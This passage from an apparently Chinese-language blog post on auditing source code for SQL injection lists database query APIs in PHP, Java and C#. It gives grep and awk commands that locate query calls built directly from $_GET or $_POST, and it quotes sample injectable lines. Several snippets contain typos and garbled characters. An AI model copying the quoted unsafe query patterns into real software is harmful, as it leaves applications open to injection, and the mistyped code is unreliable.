&lt;span class=&#34;token function&#34;&gt;pg_prepare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$connz&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;my_query&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;FROM&lt;/span&gt; table &lt;span class=&#34;token constant&#34;&gt;WHERE&lt;/span&gt; field &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; nmy_query&#34;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_select一根据指定的具有field=&amp;gt;value的assoc_array选择记录&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$table_name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$assoc_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_update (Y—用数据更新与指定条件_的记录&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_update&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$arr_update&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$arr_where&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_insert ()—将 assoc_array 的值插入到 table_name 指定的表中&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$table_name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$assoc_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_delete () 一根据assoc_array中指定的键和值删除表中的记录&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_delete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$connr&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$table_name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$assoc_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Java&#34;&gt;&lt;a href=&#34;#Java&#34; class=&#34;headerlink&#34; title=&#34;Java&#34;&gt;&lt;/a&gt;Java&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//createStatement ()一仓d建一个语句对象以便向数据库发送SQL语句&lt;/span&gt;
statement &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; connection&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;createStatement&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//prepareStatement () 一创建一条预编译的SQL语句并将其保存到对象中&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;PreparedStatement&lt;/span&gt; sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; con&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepareStatement&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//executeQuery () 一 行给定的SQL语句，从指定的表中获取数据&lt;/span&gt;
result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//executeUpdate ()— 行一条SQL语句，该语句可能是一条条返回任何值的INSERT、UPDATE或 //DELETE 语句&lt;/span&gt;
result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeUpdate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//execute ()— 行给定的SQL语句，从指定的表中获取数据&lt;/span&gt;
result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//addBatch () 一将指定的SQL命令添加到当前命令列表中&lt;/span&gt;
statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;addBatch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
statement&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;addBatch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;more_aql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;C&#34;&gt;&lt;a href=&#34;#C&#34; class=&#34;headerlink&#34; title=&#34;C#&#34;&gt;&lt;/a&gt;C#&lt;/h5&gt;&lt;p&gt;.NET开发使用下列命名空间&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-C#&#34; data-language=&#34;C#&#34;&gt;&lt;code class=&#34;language-C#&#34;&gt;System.Data.SqlClient： SQL Server 的.NET Framework Data Provider(.NET 框架数据提供程序)
System.Data.OleDb： OLE DB 的.NET Framework Data Provider
System.Data.OracleClient： Oracle 的.NET Framework Data Providero
System.Data.Odbc: ODBC 的.NET Framework Data Provider&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-C#&#34; data-language=&#34;C#&#34;&gt;&lt;code class=&#34;language-C#&#34;&gt;//SqlCommand()  用于构造或发送SQL语句或存储过程
SqlCommand command = new SqlCommand(sql, connection);
//SqlParameter()  用于向 SqlCommand 对象添加参数
SqlCommand command = new SqlCommand(sql,connection);
command.Parameters.Add(&#34;@param&#34;, SqlDbType.VarChar, 50).Value = input; 
//OleDbCommand()  用于构造或发送SQL语句或存储过程
OleDbCommand command = new OleDbCommand(sql,connection);
//OleDbParameter()  用于向 OleDbCommand 对象添加参数
OleDvCommand command = new OleDbCommand($sql,connection);
command.parameters.Add(&#34;@paran&#34;, OleDbType.VarChar, 50).Value = input; 
//OracleCommand()  用于构造/发送SQL语句或存储过程
oracleCommand command = new OracleCommand(sql,connection);
//OracleParameter()  用于向 OracleCommand 对象添加参数
OracleCommand command = new OracleCommand(sql,connection); command.Parameters.Add(&#34;@param&#34;, OleDbType.VarChar,50).Value = input; 
//OdbcCommand()  用于构造或发送SQL语句
OdbcCommand command = new OdbcCommand(sql,connection);
//OdbcParameter()  用于向 OdbcCommand 对象添加参数
OdbcCommand command = new OdbcCommand(sql,connection);
command.Parameters.Add(&#34;@paramn&#34;,OleDbType.VarChar,50) .Value = input;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;跟踪数据&#34;&gt;&lt;a href=&#34;#跟踪数据&#34; class=&#34;headerlink&#34; title=&#34;跟踪数据&#34;&gt;&lt;/a&gt;跟踪数据&lt;/h4&gt;&lt;h5 id=&#34;跟踪PHP中的数据&#34;&gt;&lt;a href=&#34;#跟踪PHP中的数据&#34; class=&#34;headerlink&#34; title=&#34;跟踪PHP中的数据&#34;&gt;&lt;/a&gt;跟踪PHP中的数据&lt;/h5&gt;&lt;p&gt;首先注意到&lt;code&gt;register_globals&lt;/code&gt;和&lt;code&gt;magic_quotes&lt;/code&gt;的状态&lt;/p&gt;
&lt;p&gt;&lt;code&gt;register_globals&lt;/code&gt;负责将EGPCS注册成全局变量，&lt;code&gt;magic_qoutes&lt;/code&gt;过滤单引号、双引号、反斜线、NULL字符。&lt;/p&gt;
&lt;p&gt;接下来排查代码，搜索php源文件目录，寻找&lt;code&gt;mssql_query()、mysql_query()、mysql_db_query()&lt;/code&gt;作用：直接将用户输入插入SQL语句中&lt;/p&gt;
&lt;p&gt;用以下命令打印匹配的内容文件名和行号&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#34;\(mysql\|mssql\|mysql_db\)_query\(.*\$\(GET\|\POST\)&#34;&lt;/span&gt;.*&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; src/ | awk -F: &#39;{print &#34;&lt;/span&gt;filename: &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token variable&#34;&gt;$l&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;nline: &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token variable&#34;&gt;$2&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;nmatch: &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token variable&#34;&gt;$3&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;n&lt;span class=&#34;token string&#34;&gt;&#34;}&#39;
filename: src/mssql_query.vuln.php
line: 11
match: &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; = mssql_query(&#34;&lt;/span&gt;SELECT * FROM TBL WHERE COLUMN &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$_GET[&#39;&lt;/span&gt;var&lt;span class=&#34;token string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;);
filename: src/mysql_query.vuln.php
line: 13
match: &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; = mysql_query(&#34;&lt;/span&gt;SELECT * FROM TBL WHERE COLUMN &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;$_GET[&#39;&lt;/span&gt;var&lt;span class=&#34;token string&#34;&gt;&#39;]&#39;&lt;/span&gt;&#34;,&lt;span class=&#34;token variable&#34;&gt;$link&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;寻找&lt;code&gt;oci_parse、ora_parse&lt;/code&gt;作用：直接将用户输入插入SQL文件中，优先级大于&lt;code&gt;oci_exec、ora_exec、oci_execute&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;命令与前面相识&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;\(oci\|ora\)_parse\(.*\&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;\(GET\|\POST\).*\)&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;print &lt;span class=&#34;token string&#34;&gt;&#34;filename: &#34;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$l&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;line: &#34;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$2&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;match: &#34;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$3&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; 
filename: src/oci_parse.vuln.php
line: 4
match: $stid = oci_parse($conn, &#34;SELECT * FROM TABLE WHERE COLUMN = &#39;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;var1]&#39;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;);
filename: src/ora_parse.vuln.php
line: 13
match: ora_parse(&lt;span class=&#34;token variable&#34;&gt;$curs&lt;/span&gt;,&#34;&lt;/span&gt;SELECT * FROM TABLE WHERE COLUMN &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$_GET[&#39;&lt;/span&gt;var&lt;span class=&#34;token string&#34;&gt;&#39;]&#39;&lt;/span&gt;&#34;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;寻找&lt;code&gt;odbc_prepare()、odbc_exec()&lt;/code&gt;作用：直接将用户输入插入SQL文件中，&lt;code&gt;odbc_prepare()&lt;/code&gt;先于&lt;code&gt;odbc_execute()&lt;/code&gt;被编译成SQL语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;\(odbc_prepare\|odbc_exec\)\(.*\&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;\(GET\|\POST\).*\)&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;寻找&lt;code&gt;mssql_bind()&lt;/code&gt;作用：直接将用户输入插入到SQL文件中，优先级大于&lt;code&gt;mssql_execute()&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;mssql_bind\(.*\&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;\(GET\|\POST\).*\)&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F:
&lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#形如&lt;/span&gt;
$&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM TBL WHERE COLUMN = &#39;$_GET[&#39;var&#39;]&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
$result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mysql_query&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; $link&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面的命令不能匹配，将上面的命令合并优化得到&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;mssql_query(\|mysql_query(\|mysql_db_query(\|oci_parse (\|ora_parse(\|mssql_bind(\|mssql_execute(\|odbc_prepare(\|odbc_execute (\|odbc_execute(\|odbc_exec(&#34;&lt;/span&gt;src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F:&lt;span class=&#34;token string&#34;&gt;&#39;{print
&#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;理想获得&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;filename: src/SQLi.MySQL.vulnerable.php
line: &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
match: &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mysql_query&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;mysql_query()向数据库发送一条查询，但不知道$sql的值，无法判断是否被污染，所以跟踪$sql变量&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;\&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&#34;&lt;/span&gt; src/ 丨 &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#变量可能重用，不采用&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

